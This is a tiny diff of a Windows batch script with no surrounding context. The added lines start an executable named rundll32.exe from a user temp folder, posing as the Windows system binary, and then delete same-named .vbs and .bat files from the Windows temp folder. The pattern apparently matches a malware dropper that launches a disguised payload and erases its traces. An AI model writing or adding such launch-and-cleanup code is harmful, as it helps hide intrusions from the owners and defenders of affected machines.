@@ -1,3 +1,4 @@
-echo off
-start C:\\windows\\temp\\Rundll32.exe
+start %localappdata%\\temp\\rundll32.exe
+del c:\\windows\\temp\\rundll32.vbs
+del c:\\windows\\temp\\rundll32.bat
 exit
